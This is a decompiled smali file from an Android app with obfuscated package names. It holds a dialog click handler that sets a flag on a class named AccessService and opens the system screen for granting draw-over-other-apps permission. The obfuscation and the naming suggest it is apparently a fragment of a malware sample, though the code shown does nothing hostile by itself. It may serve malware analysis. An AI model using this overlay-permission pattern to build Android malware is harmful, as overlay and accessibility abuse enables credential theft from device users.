.class L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over$1;
.super Ljava/lang/Object;
.source "lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over.java"

# interfaces
.implements Landroid/content/DialogInterface$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;->AskDraw()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;


# direct methods
.method constructor <init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;)V
    .locals 0

    .line 83
    iput-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/content/DialogInterface;I)V
    .locals 1

    const/4 p1, 0x1

    .line 86
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->FOR_DRW:Ljava/lang/Boolean;

    .line 88
    new-instance p1, Landroid/content/Intent;

    new-instance p2, Ljava/lang/StringBuilder;

    const-string v0, "package:"

    invoke-direct {p2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p2

    const-string v0, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    invoke-direct {p1, v0, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 89
    iget-object p2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;

    const/4 v0, 0x0

    invoke-virtual {p2, p1, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method
